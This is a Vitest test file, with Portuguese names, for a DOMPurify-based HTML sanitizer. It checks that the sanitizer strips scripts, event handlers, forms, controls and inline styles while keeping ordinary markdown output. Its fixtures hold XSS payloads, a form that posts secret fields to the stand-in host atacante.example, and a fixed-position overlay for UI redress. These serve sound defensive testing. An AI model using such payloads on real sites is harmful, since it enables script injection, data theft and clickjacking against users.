import { describe, it, expect } from 'vitest';
import { sanitizarHtml } from '../src/lib/sanitizacao';

describe('Sanitização de HTML (DOMPurify)', () => {
  it('deve retornar string vazia para entrada nula', () => {
    expect(sanitizarHtml(null)).toBe('');
    expect(sanitizarHtml('')).toBe('');
  });

  it('deve preservar HTML seguro', () => {
    const htmlSeguro = '<h1>Título</h1><p>Texto</p>';
    expect(sanitizarHtml(htmlSeguro)).toBe(htmlSeguro);
  });

  it('deve remover tags <script>', () => {
    const htmlSujo = '<p>Texto</p><script>alert("xss")</script>';
    expect(sanitizarHtml(htmlSujo)).toBe('<p>Texto</p>');
  });

  it('deve remover atributos de evento perigosos (onerror, onclick)', () => {
    const htmlSujo = '<img src="x" onerror="alert(1)" /><button onclick="exec()">Btn</button>';
    const limpo = sanitizarHtml(htmlSujo);
    expect(limpo).not.toContain('onerror');
    expect(limpo).not.toContain('onclick');
    expect(limpo).not.toContain('alert');
  });

  it('deve remover formulários e controles interativos do documento', () => {
    const htmlSujo =
      '<form action="https://atacante.example/coletar" method="post">' +
      '<input name="segredo"><textarea name="conteudo"></textarea>' +
      '<select name="opcao"></select><button type="submit">Enviar</button></form>';
    const limpo = sanitizarHtml(htmlSujo);

    expect(limpo).not.toContain('<form');
    expect(limpo).not.toContain('<input');
    expect(limpo).not.toContain('<textarea');
    expect(limpo).not.toContain('<select');
    expect(limpo).not.toContain('<button');
    expect(limpo).not.toContain('atacante.example');
  });

  it('deve remover o atributo style inline (overlay/redress da interface)', () => {
    const htmlSujo = '<div style="position:fixed;inset:0;z-index:999999">Conteúdo</div>';
    const limpo = sanitizarHtml(htmlSujo);

    expect(limpo).not.toContain('style=');
    expect(limpo).not.toContain('position:fixed');
    expect(limpo).toContain('Conteúdo');
  });

  it('deve continuar preservando a formatação normal de markdown', () => {
    const htmlSeguro =
      '<h2>Título</h2><p>Texto <strong>forte</strong> e <em>ênfase</em></p>' +
      '<ul><li>item</li></ul><blockquote><p>citação</p></blockquote>' +
      '<pre><code class="language-js">const a = 1;</code></pre>' +
      '<p><a href="https://exemplo.com">link</a> <img src="https://exemplo.com/x.png" alt="x"></p>' +
      '<table><thead><tr><th>a</th></tr></thead><tbody><tr><td>1</td></tr></tbody></table>';

    expect(sanitizarHtml(htmlSeguro)).toBe(htmlSeguro);
  });
});
